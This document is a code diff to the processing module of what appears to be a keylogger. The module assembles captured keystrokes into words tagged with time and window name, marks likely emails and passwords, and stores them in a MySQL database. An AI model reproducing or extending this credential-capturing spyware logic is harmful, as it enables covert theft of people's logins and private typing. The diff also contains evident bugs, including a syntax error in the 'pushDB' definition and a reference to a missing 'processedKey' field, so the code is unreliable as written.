@@ -1,12 +1,13 @@
 from load_config import load_cfg
+import mysql.connector
 
 class Process:
     def __init__(self):
         self.words = ""
         self.payload = {
-            "datetime": ""
-            "epoch": ""
-            "windowName": ""
+            "datetime": "",
+            "epoch": "",
+            "windowName": "",
             "processedWord":"",
             "isEmail": 0,
             "isPassword": 0
@@ -18,29 +19,27 @@ class Process:
         if (data['processedKey']):
             if (len(self.words) == 0):
                 self.payload['datetime'] = data['datetime']
-                self.payload['epoch'] = data['epoch']
+                self.payload['epoch'] = data['epochTime']
                 self.payload['windowName'] = data['windowName']
-            self.words += data['processedKey']
+            self.payload['processedWord'] += data['processedKey']
         else:
-            currWord['processedWord'] = self.words
-            print("words: "+ self.words)
-            self.checkEmailPassword(currWord)
-            self.pushDB(currWord)
-            self.words = ""
+            print("words: "+ self.payload['processedWord'])
+            self.checkEmailPassword()
+            self.pushDB()
         return 0
                 
-    def checkEmailPassword(self,payload):
+    def checkEmailPassword(self):
     #check the processedWord of the payload to determine if possible email or password
-        word = payload['processedWord']
+        word = self.payload['processedWord']
         if "@" in word:
-            payload.isEmail = 1
+            self.payload['isEmail'] = 1
         
         elif (not word.isalpha() and not word.isdigit()):
             #a high level filtering for words which are a mix of alphabet and digits, suggesting they are possible passwords
-            payload.isPassword = 1
+            self.payload['isPassword'] = 1
             
     
-    def pushDB(self,payload):
+    def pushDB(self:
     #push to table words
         main_cfg = load_cfg('./main_cfg.json')
         
@@ -53,7 +52,7 @@ class Process:
         )
         
         sql = f"INSERT INTO {main_cfg['dbWordTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s)"
-        val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['windowName']}", f"{payload['processedKey']}",f"{payload['isEmail']}", f"{payload['isPassword']}")
+        val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedKey']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
         
         print(sql,val)
         
